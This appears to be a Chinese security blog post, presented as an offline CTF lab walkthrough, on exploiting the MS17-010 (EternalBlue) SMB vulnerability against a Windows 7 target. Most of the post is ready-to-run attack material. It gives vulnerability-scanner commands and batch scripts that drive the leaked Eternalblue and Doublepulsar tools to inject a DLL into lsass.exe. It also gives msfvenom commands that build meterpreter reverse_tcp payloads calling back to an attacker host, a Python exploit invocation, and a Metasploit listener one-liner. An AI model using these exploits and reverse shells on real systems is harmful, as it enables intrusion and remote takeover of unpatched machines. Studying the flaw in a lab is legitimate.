---
title: 安全攻防 | 浅谈ms17-010多种利用方式
url: https://buaq.net/go-141164.html
source: unSafe.sh - 不安全
date: 2022-12-24
fetch_date: 2025-10-04T02:24:49.611447
---

# 安全攻防 | 浅谈ms17-010多种利用方式

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/5b243627c584cdf23b474ba4a8d08899.jpg)

安全攻防 | 浅谈ms17-010多种利用方式

以下文章来源于亿人安全 ，作者CCJ声明：本人坚决反对利用文章内容进行恶意攻击行为，一切错误行为必将受到惩罚，绿色网络需要靠我们共同维护，推荐大家在了解技术原理的前提下，更好的维护个
*2022-12-23 17:21:27
Author: [www.secpulse.com(查看原文)](/jump-141164.htm)
阅读量:50
收藏*

---

以下文章来源于亿人安全 ，作者CCJ

声明：本人坚决反对利用文章内容进行恶意攻击行为，一切错误行为必将受到惩罚，绿色网络需要靠我们共同维护，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

漏洞名称：永恒之蓝

漏洞编号：MS17-010，CVE-2017-0143/0144/0145/0146/0147/0148

漏洞类型：缓冲区溢出漏洞

## 应用场景：线下ctf综合渗透赛

漏洞影响：Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; Windows Server 2016

*1*

实验化境介绍

kali 系统：192.168.0.18

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784669.png)

win7 系统：192.168.0.28

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784670.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784671.png)

*2*

MS17-010漏洞检查

### checker.py

GitHub：https://github.com/worawit/MS17-010

```
python2 checker.py 192.168.0.28
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784672.png)

### check.bat

GitHub：https://github.com/3gstudent/Smbtouch-Scanner

```
@Smbtouch-1.1.1.exe --TargetIp %1 --OutConfig 1.txt
```

check.bat 192.168.0.28

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-16717846721.png)

### Ladon

```
Ladon.exe 192.168.0.28 MS17010
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784673.png)

### fscan

```
fscan -h 192.168.0.28
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784674.png)

*3*

MS17-010漏洞利用方式

有防火墙

https://www.bilibili.com/video/BV1Ye4y1k7X9/?share\_source=copy\_web&vd\_source=2eb72ea5238fe3398c820713b04697ff

### 无防火墙Github：

https://github.com/x0rz/EQGRP\_Lost\_in\_Translation

将工具包中以下三个目录中的文件拷贝到同一个目录中（因为64位系统是支持32位的，所以直接复制32位的就好）：

windowslibx86-Windows

windowsspecials

windowspayloads

然后在目录中，把Eternalblue-2.2.0.0.xml文件重命名成Eternalblue-2.2.0.xml，Doublepulsar-1.3.1.0.xml改为Doublepulsar-1.3.1.xml

为了方便使用，编写bat脚本

```
attack.bat 192.168.0.28
```

```
@echo off
echo =============== [ TargetIp: %1 ] ===============
Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp %1 --TargetPort 445 --Target WIN72K8R2
```

```
backdoor.bat 192.168.0.28 exp.dll
```

```
@echo offe
cho ================================================
echo [info] TargetIp: %1
echo [info] Architecture: %2
echo [info] DllPayload: %3
echo ================================================
Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp %1 --TargetPort 445 --Protocol SMB --Architecture %2 --Function RunDLL --DllPayload %3 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60
```

2. https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit

在`deps`文件夹，在目录中，把Eternalblue-2.2.0.0.xml文件重命名成Eternalblue-2.2.0.xml，Doublepulsar-1.3.1.0.xml改为Doublepulsar-1.3.1.xml

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784678.png)

编写bat脚本，使用方法和上面一样

```
@echo off
echo =============== [ TargetIp: %1 ] ===============
Eternalblue-2.2.0.exe --TargetIp %1 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig outlog.txt
@echo off
echo ================================================
echo [info] TargetIp: %1
echo [info] Architecture: %2
echo [info] DllPayload: %3
echo ================================================
Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp %1 --TargetPort 445 --Protocol SMB --Architecture %2 --Function RunDLL --DllPayload %3 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60
```

*4*

靶场环境实战利用

```
#metasploit生成dll文件
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=9999 -f dll > winx64.dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=9999 -f dll > winx86.dll
```

（1）poc检查目标服务是否开存在MS17010漏洞

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784679.png)

2.攻击

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784681.png)

3.漏洞利用

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784684.png)

metasploit上线

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784688.png)

#### 利用二

K8哥哥的`ksmb.exe`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784694.png)

成功添加用户

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784695.png)

#### 利用三

https://blackwolfsec.cc/2017/05/12/Eternalblue\_ms17-010/

需要多次利用才能成功

```
#生成shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.18 LPORT=1111 -f raw > shellcode

#利用
python3 ms17-010.py --host 192.168.0.28 --file shellcode
```

加上`--port 445`会报错

1.攻击

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-16717846951.png)

2.监听后成功上线

```
#一键启动监听
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.0.18; set lport 1111; exploit - j; "
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194017-1671784703.png)

-END-

**本文作者：[贝塔安全实验室](https://www.secpulse.com/archives/newpage/author?author_id=9525)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/194017.html**](https://www.secpulse.com/archives/194017.html)

文章来源: https://www.secpulse.com/archives/194017.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)